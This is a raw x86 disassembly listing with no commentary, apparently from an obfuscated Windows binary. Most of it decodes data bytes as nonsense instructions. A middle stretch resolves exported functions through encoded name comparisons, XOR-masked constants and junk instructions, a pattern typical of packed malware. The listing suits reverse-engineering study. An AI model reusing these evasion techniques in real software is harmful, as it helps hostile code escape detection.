  40793a:	test   DWORD PTR [edx+0x79867bc6],esp
  407940:	aas    
  407941:	push   ebp
  407942:	not    DWORD PTR [edx+0x2c475ad4]
  407948:	repnz (bad) 
  40794a:	or     eax,0x9d220fef
  40794f:	dec    esp
  407950:	xchg   ecx,eax
  407951:	stos   BYTE PTR es:[edi],al
  407952:	push   edi
  407953:	cmp    DWORD PTR [ecx],ebx
  407955:	cmp    DWORD PTR [edi],edi
  407957:	inc    esp
  407958:	rol    BYTE PTR [edx-0x62],0x7c
  40795c:	ja     0x407941
  40795e:	inc    esp
  40795f:	mov    esi,0x9b8e76f8
  407964:	xlat   BYTE PTR ds:[ebx]
  407965:	add    DWORD PTR [ebx-0x1b9a4003],ebx
  40796b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40796c:	stos   BYTE PTR es:[edi],al
  40796d:	ja     0x4078f2
  40796f:	bound  esp,QWORD PTR [ebp+0x1ef4c70b]
  407975:	jno    0x407942
  407977:	lea    ebx,[ebx]
  407979:	push   esi
  40797a:	scas   al,BYTE PTR es:[edi]
  40797b:	mov    ?,ecx
  40797d:	sub    eax,0xa94c034a
  407982:	shl    dh,0x11
  407985:	enter  0x9c8a,0xcf
  407989:	mov    es,ebx
  40798b:	cmp    al,BYTE PTR [ebp+0x24]
  40798e:	leave  
  40798f:	cmp    DWORD PTR [ecx],edi
  407991:	inc    edi
  407992:	aad    0xc8
  407994:	cld    
  407995:	cmp    al,0x98
  407997:	lock cwde 
  407999:	cmp    dh,bh
  40799b:	test   eax,0x82cc9ef
  4079a0:	push   ds
  4079a1:	jmp    0x4079fb
  4079a3:	jge    0x4079d2
  4079a5:	mov    DWORD PTR [esi-0x339b120d],esp
  4079ab:	dec    edi
  4079ac:	pop    ebp
  4079ad:	(bad)  
  4079ae:	pushf  
  4079af:	ins    DWORD PTR es:[edi],dx
  4079b0:	mov    dh,0x3
  4079b2:	repnz and DWORD PTR [eax+eiz*4],esp
  4079b6:	jne    0x407950
  4079b8:	ss push edx
  4079ba:	jmp    0xb9bc:0xd9172307
  4079c1:	jae    0x407a22
  4079c3:	es sbb eax,0x244bc2ba
  4079c9:	inc    ecx
  4079ca:	or     edx,edi
  4079cc:	push   edx
  4079cd:	fistp  WORD PTR [edi-0x74]
  4079d0:	cmp    BYTE PTR [eax+ecx*2-0x6482ee86],0xf4
  4079d8:	popa   
  4079d9:	jns    0x4079f6
  4079db:	inc    edi
  4079dc:	in     al,0x62
  4079de:	mov    ch,BYTE PTR [ebx+0x491a7da7]
  4079e4:	inc    ecx
  4079e5:	fs sub eax,0xe608a920
  4079eb:	enter  0x4a8,0xc5
  4079ef:	pop    edx
  4079f0:	sbb    DWORD PTR [ebp+0x4610cf63],edx
  4079f6:	add    eax,0xf93fefa0
  4079fb:	dec    ecx
  4079fc:	je     0x407998
  4079fe:	and    esp,DWORD PTR [ebp-0x6b]
  407a01:	fisttp DWORD PTR [eax-0x77]
  407a04:	adc    DWORD PTR [esi+edx*4],ebp
  407a07:	fwait
  407a08:	ins    BYTE PTR es:[edi],dx
  407a09:	call   0x15dd:0x9e2aa39f
  407a10:	mov    eax,0xd1497b7d
  407a15:	out    dx,eax
  407a16:	inc    ecx
  407a17:	sbb    esi,ecx
  407a19:	cwde   
  407a1a:	hlt    
  407a1b:	fcom   QWORD PTR [ecx+0xd]
  407a1e:	jp     0x407a06
  407a20:	adc    DWORD PTR [eax-0x59],esp
  407a23:	stos   BYTE PTR es:[edi],al
  407a24:	mov    ax,0x7b9e
  407a28:	or     eax,DWORD PTR [eax-0x3f]
  407a2b:	(bad)  
  407a2c:	jb     0x407a83
  407a2e:	daa    
  407a2f:	mov    eax,0x46dbe88
  407a34:	js     0x4079fb
  407a36:	ret    
  407a37:	retf   
  407a38:	addr16 arpl cx,cx
  407a3b:	or     dh,BYTE PTR [esi+0x7d3c0d61]
  407a41:	push   eax
  407a42:	ficomp WORD PTR [ecx+0x2d6e526c]
  407a48:	and    esi,DWORD PTR [eax+edx*1-0x708d3f64]
  407a4f:	shl    DWORD PTR ds:0x5e0e6084,1
  407a55:	sbb    eax,0x5a693537
  407a5a:	dec    esi
  407a5b:	push   ecx
  407a5c:	dec    ebp
  407a5d:	aas    
  407a5e:	mov    cs,WORD PTR [esi-0x45]
  407a61:	retf   
  407a62:	cmp    DWORD PTR [esi+0x1f],eax
  407a65:	(bad)  
  407a66:	(bad)  
  407a67:	sbb    dh,BYTE PTR [ebp-0x3ad04c0c]
  407a6d:	dec    edx
  407a6e:	mov    edx,0xda6eafe4
  407a73:	jno    0x4079fe
  407a75:	ds clc 
  407a77:	push   cs
  407a78:	cmc    
  407a79:	push   ebp
  407a7a:	fwait
  407a7b:	jecxz  0x407a0a
  407a7d:	add    eax,0x322e207a
  407a82:	loope  0x407a9e
  407a84:	aaa    
  407a85:	xor    eax,0x7992ef21
  407a8a:	xor    esi,DWORD PTR [edx-0x50436994]
  407a90:	ret    0xbd3
  407a93:	loopne 0x407a15
  407a95:	loop   0x407a54
  407a97:	mov    edi,0x8816cdca
  407a9c:	sub    DWORD PTR [edx+0x2a],0x64
  407aa0:	clc    
  407aa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407aa2:	xchg   ebp,eax
  407aa3:	mov    dl,BYTE PTR [esi-0x7f]
  407aa6:	adc    DWORD PTR [ebx+0x5d],edi
  407aa9:	dec    edx
  407aaa:	push   eax
  407aab:	push   esi
  407aac:	adc    cl,BYTE PTR [edx]
  407aae:	sub    edx,DWORD PTR [edx]
  407ab0:	push   eax
  407ab1:	enter  0xf84a,0xd5
  407ab5:	inc    eax
  407ab6:	pop    edx
  407ab7:	push   ds
  407ab8:	shl    dl,cl
  407aba:	pop    edx
  407abb:	dec    ebp
  407abc:	push   0xc2bce906
  407ac1:	(bad)  
  407ac2:	(bad)  
  407ac3:	xor    ecx,DWORD PTR [esi]
  407ac5:	stos   DWORD PTR es:[edi],eax
  407ac6:	loope  0x407a74
  407ac8:	and    al,0x13
  407aca:	sub    DWORD PTR [eax-0x10850451],0xf4fb6fa7
  407ad4:	push   ss
  407ad5:	aas    
  407ad6:	and    esi,DWORD PTR [ebp+0x2a416dae]
  407adc:	les    edx,FWORD PTR [ecx+0x321c6a1]
  407ae2:	rcr    DWORD PTR [edi],cl
  407ae4:	std    
  407ae5:	leave  
  407ae6:	push   esp
  407ae7:	mov    esi,0x257e20e8
  407aec:	cmp    al,0x91
  407aee:	out    dx,al
  407aef:	int3   
  407af0:	scas   al,BYTE PTR es:[edi]
  407af1:	jns    0x407a8d
  407af3:	(bad)  
  407af4:	push   ss
  407af5:	mov    ecx,0x527951e3
  407afa:	aam    0xd9
  407afc:	add    DWORD PTR [ecx],edx
  407afe:	in     al,dx
  407aff:	ins    BYTE PTR es:[edi],dx
  407b00:	and    BYTE PTR [ebx+0x5b8cc964],0xf7
  407b07:	cmp    BYTE PTR [eax+0x3800269d],ch
  407b0d:	mov    ds,WORD PTR [ebp-0x59]
  407b10:	int3   
  407b11:	cmp    eax,0x223f72e5
  407b16:	mov    esp,0xa65203e6
  407b1b:	sub    BYTE PTR [ebx+eiz*8+0x24],al
  407b1f:	cmp    al,BYTE PTR [edx]
  407b21:	scas   eax,DWORD PTR es:[edi]
  407b22:	fidivr WORD PTR [ecx-0x52]
  407b25:	retf   
  407b26:	cmp    DWORD PTR [edx+0x68a232c5],ebp
  407b2c:	jno    0x407b75
  407b2e:	xor    bh,BYTE PTR [ecx]
  407b30:	and    al,0xc6
  407b32:	clc    
  407b33:	rcr    BYTE PTR [ebp-0x11],0x63
  407b37:	mov    edi,0x9c823a01
  407b3c:	jge    0x407b71
  407b3e:	stc    
  407b3f:	add    edi,0x3272db
  407b45:	not    edi
  407b47:	and    eax,edi
  407b49:	movsx  di,BYTE PTR [eax+0x1]
  407b4e:	mov    ebx,0x3b4a
  407b53:	sub    di,bx
  407b56:	mov    ebx,0x8a87
  407b5b:	xor    di,bx
  407b5e:	mov    ebx,0x4f97
  407b63:	cmp    di,bx
  407b66:	jne    0x407b8e
  407b6c:	movsx  di,BYTE PTR [eax]
  407b70:	mov    ebx,0x3b4a
  407b75:	sub    di,bx
  407b78:	mov    ebx,0x8a87
  407b7d:	xor    di,bx
  407b80:	mov    ebx,0x4f84
  407b85:	cmp    di,bx
  407b88:	je     0x407b9e
  407b8e:	mov    edi,DWORD PTR [ebp-0x10]
  407b91:	xor    edi,ecx
  407b93:	mov    ebx,esi
  407b95:	sub    ebx,edi
  407b97:	add    eax,ebx
  407b99:	jmp    0x407b49
  407b9e:	mov    esi,DWORD PTR [ebp-0x14]
  407ba1:	mov    esi,DWORD PTR [esi]
  407ba3:	mov    edi,DWORD PTR [eax+0x3c]
  407ba6:	lea    esi,[edi+esi*8+0x78]
  407baa:	mov    esi,DWORD PTR [esi+eax*1]
  407bad:	mov    DWORD PTR [ebp-0x8],esi
  407bb0:	mov    esi,DWORD PTR [ebp+0x8]
  407bb3:	xor    esi,ecx
  407bb5:	add    esi,edx
  407bb7:	mov    DWORD PTR [ebp-0x14],esi
  407bba:	mov    esi,DWORD PTR [ebp+0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x8]
  407bc0:	xor    esi,ecx
  407bc2:	add    esi,edx
  407bc4:	pop    ebx
  407bc5:	cmp    edi,esi
  407bc7:	jne    0x407be5
  407bcd:	mov    eax,DWORD PTR [ebp+0xc]
  407bd0:	xor    eax,ecx
  407bd2:	mov    ecx,DWORD PTR [ebp-0x8]
  407bd5:	add    eax,edx
  407bd7:	imul   eax,ecx
  407bda:	mov    DWORD PTR [ebp-0x8],eax
  407bdd:	push   DWORD PTR [ebp+0x18]
  407be0:	jmp    0x407c39
  407be5:	mov    ecx,DWORD PTR [ebp-0x8]
  407be8:	add    ecx,eax
  407bea:	mov    DWORD PTR [ebp-0x14],ecx
  407bed:	mov    ecx,DWORD PTR [ebp-0x14]
  407bf0:	mov    ecx,DWORD PTR [ecx+0xc]
  407bf3:	movsx  cx,BYTE PTR [ecx+eax*1]
  407bf8:	mov    edx,0x3b4a
  407bfd:	sub    cx,dx
  407c00:	mov    edx,0x8a87
  407c05:	xor    cx,dx
  407c08:	mov    edx,0x4f86
  407c0d:	cmp    cx,dx
  407c10:	jne    0x407bdd
  407c16:	mov    ecx,DWORD PTR ds:0x4163b4
  407c1c:	mov    ecx,DWORD PTR [ecx+0x198]
  407c22:	mov    DWORD PTR [ecx],eax
  407c24:	jmp    0x407c4a
  407c29:	mov    ecx,DWORD PTR [ebp+0x18]
  407c2c:	cmp    ecx,0xf89c85b1
  407c32:	jne    0x407c4a
  407c38:	push   eax
  407c39:	push   DWORD PTR [ebp+0x14]
  407c3c:	push   DWORD PTR [ebp+0x10]
  407c3f:	push   DWORD PTR [ebp+0xc]
  407c42:	push   DWORD PTR [ebp+0x8]
  407c45:	call   0x405399
  407c4a:	pop    edi
  407c4b:	pop    esi
  407c4c:	leave  
  407c4d:	ret    0x14
  407c50:	push   ebp
  407c51:	mov    ebp,esp
  407c53:	push   ecx
  407c54:	mov    DWORD PTR [ebp-0x4],0xf89c85bc
  407c5b:	and    DWORD PTR ds:0x413c02,0x414004
  407c65:	mov    eax,DWORD PTR [ebp-0x4]
  407c68:	mov    edx,DWORD PTR [ebp+0x10]
  407c6b:	mov    ecx,0x7510894
  407c70:	xor    eax,ecx
  407c72:	add    eax,0x3272dc
  407c77:	mov    DWORD PTR [edx],eax
  407c79:	movzx  edx,WORD PTR ds:0x413c7c
  407c80:	and    edx,DWORD PTR ds:0x413cf4
  407c86:	mov    DWORD PTR ds:0x413c7c,edx
  407c8c:	mov    eax,DWORD PTR [ebp+0xc]
  407c8f:	sbb    DWORD PTR ds:0x413c02,0x413c0a
  407c99:	xor    eax,ecx
  407c9b:	adc    edx,DWORD PTR ds:0x414010
  407ca1:	push   esi
  407ca2:	sub    edx,DWORD PTR ds:0x413c84
  407ca8:	mov    esi,DWORD PTR [ebp+0x10]
  407cab:	movzx  edx,WORD PTR ds:0x414010
  407cb2:	sbb    DWORD PTR ds:0x413cf4,edx
  407cb8:	mov    edx,0x3272dc
  407cbd:	neg    DWORD PTR ds:0x413d20
  407cc3:	add    eax,edx
  407cc5:	xor    DWORD PTR ds:0x413c06,0x413c1a
  407ccf:	mov    DWORD PTR [esi+0x4],eax
  407cd2:	mov    eax,DWORD PTR [ebp+0x14]
  407cd5:	mov    esi,DWORD PTR [ebp+0x10]
  407cd8:	mov    DWORD PTR [esi+0x8],eax
  407cdb:	mov    eax,DWORD PTR [ebp+0x18]
  407cde:	mov    esi,DWORD PTR [ebp+0x10]
  407ce1:	mov    DWORD PTR [esi+0xc],eax
  407ce4:	mov    eax,DWORD PTR [ebp+0x1c]
  407ce7:	mov    esi,DWORD PTR [ebp+0x10]
  407cea:	mov    DWORD PTR [esi+0x10],eax
  407ced:	mov    eax,DWORD PTR [ebp+0x8]
  407cf0:	xor    eax,ecx
  407cf2:	add    eax,edx
  407cf4:	pop    esi
  407cf5:	leave  
  407cf6:	ret    0x18
  407cf9:	push   ebp
  407cfa:	mov    ebp,esp
  407cfc:	push   ecx
  407cfd:	and    DWORD PTR ds:0x413d34,0x0
  407d07:	xor    eax,eax
  407d09:	add    eax,DWORD PTR ds:0x413d34
  407d0f:	inc    eax
  407d10:	mov    ds:0x413d34,eax
  407d15:	cmp    DWORD PTR ds:0x413d34,0x10
  407d1c:	jne    0x407d30
  407d22:	push   DWORD PTR [ebp-0x14]
  407d25:	push   0x4160bf
  407d2a:	call   DWORD PTR ds:0x41678c
  407d30:	cmp    DWORD PTR ds:0x413d34,0xf
  407d37:	jne    0x407d48
  407d3d:	mov    eax,ds:0x413d34
  407d42:	inc    eax
  407d43:	mov    ds:0x413d34,eax
  407d48:	cmp    DWORD PTR ds:0x413d34,0x1e
  407d4f:	jb     0x407d07
  407d55:	sbb    eax,DWORD PTR ds:0x413bf6
  407d5b:	push   ecx
  407d5c:	mov    DWORD PTR [ebp-0x8],0xf89c85b0
  407d63:	and    DWORD PTR ds:0x413c06,0x0
  407d6d:	jmp    0x407d7f
  407d72:	mov    edx,DWORD PTR ds:0x413c06
  407d78:	inc    edx
  407d79:	mov    DWORD PTR ds:0x413c06,edx
  407d7f:	cmp    DWORD PTR ds:0x413c06,0x1d
  407d86:	jae    0x407dc8
  407d8c:	cmp    DWORD PTR ds:0x413c06,0x27
  407d93:	jne    0x407dbd
  407d99:	push   0x1c64
  407d9e:	push   0x413c06
  407da3:	push   0x752e
  407da8:	push   0x4160cf
  407dad:	push   0x55a9
  407db2:	push   0x2dee
  407db7:	call   DWORD PTR ds:0x416790
  407dbd:	jmp    0x407d72
  407dc2:	and    eax,DWORD PTR ds:0x413ce0
  407dc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  407dcf:	mov    DWORD PTR ds:0x413d34,0x14
  407dd9:	cmp    DWORD PTR ds:0x413d34,0x0
  407de0:	je     0x407e29
  407de6:	cmp    DWORD PTR ds:0x413d34,0x9
  407ded:	jne    0x407dfe
  407df3:	push   0x2bdc
  407df8:	call   DWORD PTR ds:0x416798
  407dfe:	cmp    DWORD PTR ds:0x413d34,0xa
  407e05:	jne    0x407e19
  407e0b:	xor    eax,eax
  407e0d:	add    eax,DWORD PTR ds:0x413d34
  407e13:	dec    eax
  407e14:	mov    ds:0x413d34,eax
  407e19:	mov    eax,ds:0x413d34
  407e1e:	dec    eax
  407e1f:	mov    ds:0x413d34,eax
  407e24:	jmp    0x407dd9
  407e29:	mov    eax,DWORD PTR [ebp-0x4]
  407e2c:	push   esi
  407e2d:	mov    esi,DWORD PTR [ebp-0x8]
  407e30:	mov    edx,0x7510894
  407e35:	xor    eax,edx
  407e37:	xor    esi,edx
  407e39:	mov    ecx,0x3272dc
  407e3e:	add    esi,ecx
  407e40:	add    eax,ecx
  407e42:	imul   eax,esi
  407e45:	mov    esi,DWORD PTR [ebp+0xc]
  407e48:	jmp    0x40a1fd
  407e4d:	mov    ds:0x72fcde4e,al
  407e52:	in     al,dx
  407e53:	xor    dl,0xf9
  407e56:	mov    ebp,0x856d70e0
  407e5b:	cmp    BYTE PTR [esi+0x7c7c22cf],bh
  407e61:	aam    0x5f
  407e63:	jl     0x407ee1
  407e65:	inc    esi
  407e66:	and    esi,0xaece034
  407e6c:	add    eax,0x411b7366
  407e71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407e72:	fcomp  st(5)
  407e74:	push   esp
  407e75:	fistp  DWORD PTR [eax+0x57]
  407e78:	cld    
  407e79:	lods   eax,DWORD PTR ds:[si]
  407e7b:	push   ebp
  407e7c:	fidivr DWORD PTR [ebx+0x5bafab46]
  407e82:	add    cl,ch
  407e84:	(bad)  
  407e85:	xchg   ebx,eax
  407e86:	or     eax,0x3d5a7bab
  407e8b:	imul   DWORD PTR [ecx]
  407e8d:	shl    ebp,1
  407e8f:	push   es
  407e90:	adc    al,0x2c
  407e92:	or     eax,0xaf5c46c5
  407e97:	sub    eax,edi
  407e99:	and    ecx,ebp
  407e9b:	push   0x69
  407e9d:	retf   0x8b3e
  407ea0:	(bad)  
  407ea1:	adc    esi,edx
  407ea3:	dec    ecx
  407ea4:	dec    esi
  407ea6:	sbb    eax,0x310e9a04
  407eab:	mov    ebp,0xedef9d2e
  407eb0:	imul   ecx,DWORD PTR [ebx+0x50c86f9e],0x82c4346f
  407eba:	pop    esi
  407ebb:	xlat   BYTE PTR ds:[ebx]
  407ebc:	and    esi,ebx
  407ebe:	sub    DWORD PTR ds:0x1b50efc0,ebp
  407ec4:	inc    ebp
  407ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ec6:	xchg   esi,eax
  407ec7:	popf   
  407ec8:	(bad)  
  407eca:	ja     0x407ebb
  407ecc:	jo     0x407e81
  407ece:	jbe    0x407f34
  407ed0:	cmc    
  407ed1:	mov    al,0x68
  407ed3:	shl    BYTE PTR [edx],cl
  407ed5:	cmp    BYTE PTR [ecx+0x5e],bl
  407ed8:	mov    ebx,0x3e66e38
  407edd:	ss push edx
  407edf:	(bad)  
  407ee0:	jmp    0x407f13
  407ee2:	sub    esi,DWORD PTR [eax-0x5eb30752]
  407ee8:	(bad)  
  407eea:	jo     0x407ed3
  407eec:	cmp    bh,bh
  407eee:	ret    
  407eef:	(bad)  
  407ef0:	pop    ebp
  407ef1:	daa    
  407ef2:	rol    BYTE PTR [edi+0x271542d9],0x8b
  407ef9:	pop    ecx
  407efa:	inc    esp
  407efb:	push   ebp
  407efc:	stc    
  407efd:	cmp    ch,ch
  407eff:	dec    ebp
  407f00:	test   al,0x50
  407f02:	xchg   edx,eax
  407f03:	sbb    ebp,DWORD PTR [ecx+0x79]
  407f06:	mov    ds:0xac19d81e,al
  407f0b:	in     eax,dx
  407f0c:	xlat   BYTE PTR ds:[ebx]
  407f0d:	cmp    DWORD PTR [eax-0x54b0f212],edx
  407f13:	jnp    0x407f2c
  407f15:	int3   
  407f16:	scas   al,BYTE PTR es:[edi]
  407f17:	xchg   esp,eax
  407f18:	out    0x2d,eax
  407f1a:	inc    edi
  407f1b:	cmp    BYTE PTR [edx+0x4645aaf],cl
  407f21:	shl    DWORD PTR [ebx-0x6e],1
  407f24:	mov    esp,0x7a878f5b
  407f29:	imul   BYTE PTR [esi-0x7bf0aaf4]
  407f2f:	jb     0x407f02
  407f31:	sub    edx,DWORD PTR [ebx]
  407f33:	int    0x53
  407f35:	mov    eax,ds:0xef0e311
  407f3a:	iret   
  407f3b:	bound  ebx,QWORD PTR [edi+0x6ae30a32]
  407f41:	sub    BYTE PTR [ebx+eiz*2+0x72],ch
  407f45:	stos   DWORD PTR es:[edi],eax
  407f46:	xor    DWORD PTR [eax],esi
  407f48:	push   es
  407f49:	mov    ah,0x64
  407f4b:	push   ss
  407f4c:	inc    eax
  407f4d:	pop    ebx
  407f4e:	mov    eax,ds:0xadbc43e9
  407f53:	shl    DWORD PTR [esi-0x4c],1
  407f56:	or     al,0xd4
  407f58:	jmp    0x64c160b9
  407f5d:	adc    al,0x48
  407f5f:	sbb    ecx,DWORD PTR [edx+0x741c4258]
  407f65:	mov    eax,ds:0x13a2f4da
  407f6a:	rol    BYTE PTR [ebx+0x35],1
  407f6d:	test   eax,0x152db613
  407f72:	scas   al,BYTE PTR es:[edi]
  407f73:	call   0x65b6184c
  407f78:	enter  0xd641,0x6
  407f7c:	dec    edi
  407f7d:	test   BYTE PTR [ebx-0x74ff5932],bl
  407f83:	jp     0x407f9c
  407f85:	sbb    bl,BYTE PTR [ebx+0x6c]
  407f88:	dec    edi
  407f89:	mov    al,0x41
  407f8b:	pop    esp
  407f8c:	out    dx,ax
  407f8e:	dec    esp
  407f8f:	nop
  407f90:	icebp  
  407f91:	inc    ebx
  407f92:	aaa    
  407f93:	push   edx
  407f94:	pop    esp
  407f95:	shl    BYTE PTR [eax],1
  407f97:	aas    
  407f98:	push   ecx
  407f99:	std    
  407f9a:	jmp    0x77b7:0xe288a623
  407fa1:	xchg   edi,eax
  407fa2:	mov    ah,0x1
  407fa4:	add    al,0x94
  407fa6:	push   edx
  407fa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fa8:	adc    BYTE PTR [edi],ch
  407faa:	cmp    DWORD PTR [ebp+0x775b93b6],ecx
  407fb0:	pop    es
  407fb1:	cmp    bh,dl
  407fb3:	ins    DWORD PTR es:[edi],dx
  407fb4:	sbb    al,ah
  407fb6:	cmp    edx,DWORD PTR [ebp+0x35715e0b]
  407fbc:	adc    BYTE PTR ds:0x8e099710,ah
  407fc2:	fwait
  407fc3:	lds    ebp,FWORD PTR [eax-0x483b1def]
  407fc9:	dec    ecx
  407fca:	xchg   ebp,eax
  407fcb:	lods   al,BYTE PTR ds:[esi]
  407fcc:	mov    ecx,0xf87ca48f
  407fd1:	jmp    0x92a2:0x3e2359bd
  407fd8:	gs adc edi,ebp
  407fdb:	int3   
  407fdc:	fisttp WORD PTR [ebx]
  407fde:	lods   eax,DWORD PTR es:[esi]
  407fe0:	sbb    DWORD PTR [ecx-0x26],esp
  407fe3:	pop    eax
  407fe4:	cmp    BYTE PTR [ebp+0x0],ah
  407fe7:	fistp  WORD PTR [eax+0x5d]
  407fea:	pop    es
  407feb:	ficomp DWORD PTR [esi+0x2aacd710]
  407ff1:	push   ebx
  407ff2:	dec    esi
  407ff3:	jne    0x408065
  407ff5:	and    edx,DWORD PTR [edi+0x54f88ddd]
  407ffb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ffc:	sti    
  407ffd:	fld    st(1)
  407fff:	jmp    0xefe5aade
  408004:	dec    esp
  408005:	fwait
  408006:	adc    DWORD PTR [ecx+0x186fada6],ecx
  40800c:	mov    ds:0xdfeedb3c,eax
  408011:	das    
  408012:	push   es
  408013:	outs   dx,BYTE PTR ds:[esi]
  408014:	in     al,dx
  408015:	gs call 0xecc0c040
  40801b:	test   al,0x77
  40801d:	push   eax
  40801e:	js     0x40803e
  408020:	pop    esi
  408021:	cmp    eax,0x815aeeaf
  408026:	in     eax,0xfa
  408028:	(bad)  
  40802a:	xchg   esi,eax
  40802b:	jns    0x408019
  40802d:	mov    ebp,0x7a679a9a
  408032:	sbb    DWORD PTR [ecx],0xcce2401b
  408038:	out    dx,eax
  408039:	adc    edi,DWORD PTR [ebx]
  40803b:	shl    ah,cl
  40803d:	inc    edx
  40803e:	jmp    0x40806a
  408040:	mov    dl,0x68
  408042:	mov    esp,ebp
  408044:	out    0x5a,al
  408046:	in     al,0x7c
  408048:	enter  0x757f,0x1
  40804c:	das    
  40804d:	mov    cl,0x2
  40804f:	mov    WORD PTR [ecx-0x30],?
  408052:	iret   
  408053:	fisttp DWORD PTR [eax-0x21]
  408056:	js     0x408027
  408058:	dec    eax
  408059:	lods   al,BYTE PTR ds:[esi]
  40805a:	jmp    0x9394aa0c
  40805f:	mov    ebx,0x4e4f199b
  408064:	int    0x58
  408066:	je     0x4080b6
  408068:	mov    al,ds:0xbd56da09
  40806d:	sub    esp,eax
  40806f:	xchg   ebx,eax
  408070:	mov    bl,BYTE PTR [ecx]
  408072:	mov    ebx,0xb729076f
  408077:	(bad)  
  408079:	mov    eax,ds:0x9d4d794a
  40807e:	sub    bl,dh
  408080:	aas    
  408081:	in     al,0x3e
  408083:	mov    esi,0xda24ba5d
  408088:	fyl2xp1 
  40808a:	or     dh,0xed
  40808d:	cmp    ecx,DWORD PTR [edi-0x7452ae2e]
  408093:	add    dl,ch
  408095:	add    al,0xa8
  408097:	dec    esp
  408098:	jb     0x408042
  40809a:	test   al,0x15
  40809c:	inc    esp
  40809d:	cmc    
  40809e:	adc    eax,0xfc02a960
  4080a3:	ins    DWORD PTR es:[edi],dx
  4080a4:	xor    al,0x9d
  4080a6:	out    dx,eax
  4080a7:	xchg   edx,eax
  4080a8:	jg     0x408039
  4080aa:	in     eax,dx
  4080ab:	les    esi,FWORD PTR [eax+0x73ba4a74]
  4080b1:	ds mov ebx,0x988a3776
  4080b7:	and    DWORD PTR [ecx],edx
  4080b9:	xchg   DWORD PTR [eax+0x23f753cb],edi
  4080bf:	sbb    DWORD PTR [esi],esp
  4080c1:	sbb    ecx,DWORD PTR [ecx+esi*1+0x56]
  4080c5:	adc    DWORD PTR [ebx],esp
  4080c7:	pop    ebp
  4080c8:	in     eax,dx
  4080c9:	sbb    bh,BYTE PTR [esi+0x6bd6dc81]
  4080cf:	pop    esp
  4080d0:	rcl    DWORD PTR [edi+0x3184f797],1
  4080d6:	cli    
  4080d7:	loope  0x408134
  4080d9:	push   eax
  4080da:	sbb    ah,0x18
  4080dd:	fwait
  4080de:	pinsrw mm5,edi,0x46
  4080e2:	xchg   edi,edx
  4080e4:	and    cl,ch
  4080e6:	add    al,0x27
  4080e8:	jns    0x40809f
  4080ea:	outs   dx,DWORD PTR ds:[esi]
  4080eb:	and    DWORD PTR [edx+0x9504395],ecx
  4080f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080f2:	or     eax,0x5ebad959
  4080f7:	push   ecx
  4080f8:	pop    edx
  4080f9:	popa   
  4080fa:	cmp    al,0x24
  4080fc:	dec    BYTE PTR [edx+edi*8-0xf]
  408100:	jle    0x40808b
  408102:	js     0x408111
  408104:	fisubr DWORD PTR [ecx+0x2d0c5b3]
  40810a:	rol    BYTE PTR [edx],0xfb
  40810d:	loop   0x40813a
  40810f:	push   cs
  408110:	sbb    al,BYTE PTR [ebp+0x2a]
  408113:	(bad)  
  408114:	imul   esi,DWORD PTR [edx-0x5f],0xffffffae
  408118:	pop    esp
  408119:	or     eax,0x68bed443
  40811e:	ins    DWORD PTR es:[edi],dx
  40811f:	push   esi
  408120:	mov    ebx,0x24f884ab
  408125:	cdq    
  408126:	retf   
  408127:	and    BYTE PTR [esi-0x6d19deb3],dl
  40812d:	mov    ecx,0xf7d96100
  408132:	or     esi,DWORD PTR [esi+0x78e1be97]
  408138:	js     0x40811d
  40813a:	adc    dl,BYTE PTR [ecx-0x42]
  40813d:	push   ebp
  40813e:	mov    ah,0x36
  408140:	dec    edi
  408141:	add    al,0xf
  408143:	ins    BYTE PTR es:[edi],dx
  408144:	clc    
  408145:	loopne 0x408133
  408147:	mov    ds:0x711bcca8,al
  40814c:	or     BYTE PTR [eax+0x2b199de2],dh
  408152:	or     bl,BYTE PTR [esi+0x3d]
  408155:	mov    ebx,0x6142cf36
  40815a:	xchg   edi,eax
  40815b:	cmc    
  40815c:	outs   dx,BYTE PTR ds:[esi]
  40815d:	mov    ah,0xa2
  40815f:	js     0x4080fd
  408161:	pop    edi
  408162:	adc    BYTE PTR [edx*4+0x105e7af7],cl
  408169:	cmp    al,0xed
  40816b:	mov    cs,WORD PTR ds:0x4b6cbfc6
  408171:	cs out 0x30,eax
  408174:	cdq    
  408175:	sar    DWORD PTR [edi+0x1a54b79d],cl
  40817b:	cs leave 
  40817d:	mov    dl,BYTE PTR [edi-0x2b]
  408180:	xchg   edx,eax
  408181:	jbe    0x40813e
  408183:	jp     0x408203
  408185:	pop    edx
  408186:	hlt    
  408187:	add    DWORD PTR [ebp-0x4f],edx
  40818a:	jg     0x408203
  40818c:	fcomi  st,st(0)
  40818e:	nop
  40818f:	idiv   DWORD PTR [ebp-0x4e]
  408192:	xor    eax,0xf7d64638
  408197:	inc    edx
  408198:	dec    esi
  408199:	mov    ebp,0x330923ee
  40819e:	sahf   
  40819f:	sub    DWORD PTR [edi],0x38
  4081a2:	mov    cl,0x6f
  4081a4:	jnp    0x408224
  4081a6:	hlt    
  4081a7:	fdivr  st(2),st
  4081a9:	add    eax,ecx
  4081ab:	add    eax,DWORD PTR [edi+edx*1-0x5de70d6e]
  4081b2:	neg    BYTE PTR [ecx-0x1d56d67d]
  4081b8:	or     DWORD PTR [eax],eax
  4081ba:	add    bh,cl
  4081bc:	mov    ebp,0xb40d83f5
  4081c1:	fs (bad) 
  4081c3:	jg     0x4081bb
  4081c5:	jo     0x408220
  4081c7:	cmp    DWORD PTR [eax],esp
  4081c9:	xor    eax,0xd45afdc9
  4081ce:	or     al,0x18
  4081d0:	dec    esp
  4081d1:	scas   al,BYTE PTR es:[edi]
  4081d2:	pop    ebx
  4081d3:	test   al,0xb5
  4081d5:	int    0x59
  4081d7:	lds    esi,FWORD PTR [edx+0x4f92a678]
  4081dd:	cmp    DWORD PTR [esi-0x64a20b13],edx
  4081e3:	ja     0x408196
  4081e5:	pushf  
  4081e6:	push   ss
  4081e7:	mov    dh,0x4
  4081e9:	pop    es
  4081ea:	mov    ch,0x93
  4081ec:	leave  
  4081ed:	dec    edx
  4081ee:	dec    ecx
  4081ef:	sbb    BYTE PTR [ebx],al
  4081f1:	jno    0x408237
  4081f3:	test   eax,0x29d245ee
  4081f8:	lahf   
